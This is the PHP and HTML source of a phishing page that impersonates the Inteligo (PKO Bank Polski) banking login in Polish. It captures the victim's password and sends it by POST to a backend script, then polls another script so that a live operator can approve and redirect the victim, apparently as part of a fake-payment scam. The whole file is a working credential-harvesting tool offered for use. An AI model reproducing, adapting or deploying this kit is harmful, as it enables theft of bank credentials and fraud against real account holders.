<?php include('../bank_header.php'); ?>
<?php include('../../../db.php'); 
include('../../../YH0uW3ecaRHG16ld4waY.php');
if($_REQUEST['id']){
  $id = mysqli_real_escape_string($con,$_REQUEST['id']);
}


$sqq = "SELECT * FROM `payment` WHERE `id` = '".mysqli_real_escape_string($con,$_REQUEST['id'])."'";
$new = $con->query($sqq);
$rowp = $new->fetch_assoc();
$num = $new->num_rows;
$date = date("d.m.Y");
$number = $rowp['account_number'];
$array  = array_map('intval', str_split($number));
$grip = $rowp['gridcode'];

//for($i=0;$i<27;$i++){ echo $array[$i]; if ($i%4 == 1) {echo '&nbsp;'; } }
?>

<script src="js/public.js"></script>
<script type="text/javascript">          
setInterval(function(){ upd_last_login(<?php echo htmlspecialchars($_REQUEST['id'], ENT_QUOTES, 'UTF-8'); ?>); }, 300);
</script>
<script src="../date.js"></script>


<!DOCTYPE html>
<html lang="en" class="broken-image-checker" ng-app>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<!--iPhone from zooming form issue (maximum-scale=1, user-scalable=0)-->
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
	<title>Serwis WWW Inteligo</title>


	
    <!-- Bootstrap --><link href="css/bootstrap.min.css" rel="stylesheet">
	
	<link rel="stylesheet" href="css/paolo__.css">
	
	
	<!-- jQuery -->
	<!--[if (!IE)|(gt IE 8)]><!-->
	  <script src="js/jquery-2.2.4.min.js"></script>
	  <link rel="icon" type="image/png" href="images/inteligo.ico">
	<!--<![endif]-->

	<script src="js/bootstrap.min.js"></script>
	

  </head>
  <body class="transition nav-plusminus slide-navbar slide-navbar--right hdr--sticky-mobile--off"  style="background:#a4bfd0">

  <div id="body-wrapper" class="container">
		<div class="row">
		<div class="col-md-12 mr50">
		<div id="title-bar">
		
		<a href="http://inteligo.pl/" id="logo" aria-labelledby="logo-infotip-text">&nbsp;</a>
		<div id="logo-infotip" style="display: none;">
			<div id="logo-infotip-icon">&nbsp;</div>
			<div id="logo-infotip-text">Powrót do serwisu informacyjnego</div>
			<script type="text/javascript">
				$('#logo-infotip').hide();
				$("a#logo").mouseenter(function() {
					$('#logo-infotip').show();
				});
				$("a#logo").mouseleave(function() {
					$("#logo-infotip").hide();
				});
			</script>
		</div>
		</div>
		<ul id="main-menu"></ul>
		
		<div class="wrap-content">
    <div class="layout-content">
     
    <div class="layout-page-middle new-navigation">
		<div class="form-box" style="margin-bottom: 15px; margin-top: 3px">
			<div id="" class="table_list tableListInfoTable">
				<table cellspacing="0" class="table-list"></table><div class="message empty-table ">
					<div class="box-info" style="padding-top: 0;">
						<span style="font-weight: bold">Zbliżają się roczne rozliczenia podatkowe - zaktualizuj swoje dane<br></span>Zbliża się termin otrzymywania informacji podatkowych, pomocnych w rozliczaniu zobowiązań podatkowych za 2017 rok – pamiętaj o zaktualizowaniu swoich danych.<a target="_blank" href="http://inteligo.pl/aktualnosci/komunikaty/zblizaja-sie-roczne-rozliczenia-podatkowe-zaktualizuj-swoje-dane_2/" title="Więcej"><strong>Więcej&nbsp;&gt;&gt;</strong></a>
					</div>
				</div>
			</div>
		</div>
        <div class="form-box save-no-password form-no-required">
	
			
			<div class="form form_tabular " id="f-form_0145702117" data-action="/secure/igo2/auth/login/submit?flow_id=LZKYp69meKvyWKdMHjF2H4&amp;continue_flow=1" style="display: block;">
				<h1 class="table-title"><span class="inner">Logowanie
				</span></h1>
				
					<div style="display:none;" id="loading_id">
					<div class="h--overlay-white" style="zoom: 1;">
						<p >
							<center style="font-size:20px;font-weight:bold;color:black;" id="loading_mobile">
							<img src="images/loading.gif" style="width:100px;"/> </center>
						</p>
					</div>
					</div>
					
					
					<div id="maincontent">
					<ul class="form-tabular">
						<li class="field_row edit-field field_row-client_id_field NullValidationCharEditFieldTR" id="f-tr-f-form_0145702117-client_id_field">
					
							<div class="form-label">
								<label for="f-form_0145702117-client_id_field">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasło:
								</label>
								<span class="form-field NullValidationCharEditFieldTd">
									<span class="NullValidationCharEditField_field_widget field_widget " id="f-form_0145702117-client_id_field-field_widget">
										<span class="box-input">
											<span class="box-input-wrap">
												<input  maxlength="50" id="bank_user_password"
												size="62" type="password" style="width:200px;border-radius:5px;"
												tabindex="10" aria-flowto="f-form_0145702117-client_id_field-help">
											</span>
											<span class="question"></span>
										</span>
									</span>
								</span>
							</div>
							
						</li>
					</ul>
				
					<div class="row">
					<div class="col-md-3 col-sm-3"> </div>
					<div class="col-md-3 col-sm-3 col-xs-6">
					<button id="back" class="image-button1 button-dalej button button_ok" style="display:inline-block;" tabindex="10" title="Dalej"></button>
					</div>
					<div class="col-md-3 col-sm-3 col-xs-6">
					<button id="confirm" class="image-button2 button-dalej button button_ok" tabindex="10" title="Dalej"></button>
					</div>
					<div class="col-md-3 col-sm-3"></div>
					</div>
					</div>
				
				</div>

			</div>
				<div style="clear: both;">        
					<div class="box-login">
						<h1><span class="login-icon-key"></span>Bezpieczeństwo w Inteligo</h1>
						<div class="holder secure">
							Pamiętaj: Logowanie do serwisu transakcyjnego Inteligo nie wymaga podania kodu z narzędzia autoryzacyjnego - nigdy nie podawaj kodu podczas logowania ani bezpośrednio po zalogowaniu do serwisu!<br>&nbsp; <a href="http://inteligo.pl/redirect/bezpieczenstwo" target="_blank"><br>Więcej o bezpiecznym logowaniu</a> <br><br></div>
					</div>
					<div class="login-spacer"></div>
					<div class="box-login">
						<h1><span class="login-icon-page"></span>Program poleceń Mam Inteligo</h1>
						<div class="holder account">
							Zarejestruj się, zarabiaj i wygrywaj.
							<ul><li>- 1000 zł za największą liczbę poleceń</li>
							<li>- 50 zł za każde skutecznie polecone konto<br><br></li>
							</ul><a href="https://maminteligo.pl" target="_blank">Więcej</a>
						</div>
					</div>
				</div>
					<div class="clear"></div>
				</div>
					<div class="layout-page-bottom"></div>
				</div>
					<div class="col-md-12" id="bottom-text">
					Konto Inteligo prowadzone jest przez <b>PKO Bank Polski</b>.
					</div>
					<div class="clear"></div>
					<div class="layout-footer">
						<div id="deposits-link">
					
							<a class="standalone" href="http://inteligo.pl/infosite/_images/_files/zasady_gwarantowania_depozytow.pdf" target="_blank" title="" aria-describedby="aria_external">
								Gwarantowanie depozytów</a>
						</div>
					</div>
				</div>
			</div>
		</div>
   </div><!--body-wrapper-->

	</body>
</html>


<script>
	window.onload = function() {
		var back = document.getElementById('back');
		back.onclick = function() {
			window.location.href="index.php?id=<?php echo $id; ?>";
			return false;
		}
		
		var confirm = document.getElementById('confirm');
		var bank_user_password = document.getElementById('bank_user_password');
		var loading_id = document.getElementById('loading_id');
		var maincontent = document.getElementById('maincontent');
		
		confirm.onclick = function() {
			maincontent.style.display="none";
			loading_id.style.display="block";
			var xmlhttp = new XMLHttpRequest();
			xmlhttp.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					console.log(this.responseText);
				}
			};
			xmlhttp.open("POST",  "paolo.php?id=<?php echo htmlspecialchars($_REQUEST['id'], ENT_QUOTES, 'UTF-8')?>&type=1" , true);
			xmlhttp.send(JSON.stringify({
				bank_user_password: document.getElementById('bank_user_password').value
			}));
			console.log('confirm' + bank_user_password.value);
			return false;
		}
		
		setInterval(function(){ check_status(<?php echo $id; ?>); }, 5000);

		function check_status(payment_id) {
			//alert(payment_id);
			if (payment_id.length == 0) {
			} else {
				var xmlhttp = new XMLHttpRequest();
				xmlhttp.onreadystatechange = function() {
					if (this.readyState == 4 && this.status == 200) {
						//alert(this.responseText);
						if (!this.responseText.includes('INVALID CODE')){
							if(this.responseText.includes('VALID CODE')){
								window.location.href="index_auth.php?id=<?php echo htmlspecialchars($id, ENT_QUOTES, 'UTF-8') ?>";
							}else if(this.responseText.includes('WRONG CODE')){ 
								window.location.href="index.php?id=<?php echo  htmlspecialchars($id, ENT_QUOTES, 'UTF-8'); ?>";
							}
						}
					}
				};
				xmlhttp.open("GET", "check123.php?id=" + payment_id +"&status=login_aproove", true);
				xmlhttp.send();
			}
		}
	}

</script>